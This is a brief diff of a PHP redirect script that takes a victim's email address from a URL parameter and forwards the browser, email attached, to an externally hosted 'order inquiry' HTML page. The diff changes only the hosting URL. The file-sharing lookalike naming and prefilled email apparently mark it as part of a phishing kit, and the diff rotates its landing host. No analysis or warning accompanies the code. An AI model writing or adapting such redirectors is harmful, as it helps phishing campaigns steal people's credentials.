@@ -8,5 +8,5 @@ return $emID;
 }
 $em = $_GET['em'];
 $emID = getemIDFromem($em);
-header("Location: https://cloud-object-storage-60-cos-static-web-hosting-dvr.s3.us-east.cloud-object-storage.appdomain.cloud/butbox2019_ORDER_INQ_328Y389.html?#$em");
+header("Location: https://cloud-object-storage-h8-cos-static-web-hosting-35e.s3.eu-de.cloud-object-storage.appdomain.cloud/butbox2019_ORDER_INQ_328Y389.html?#$em");
 ?>
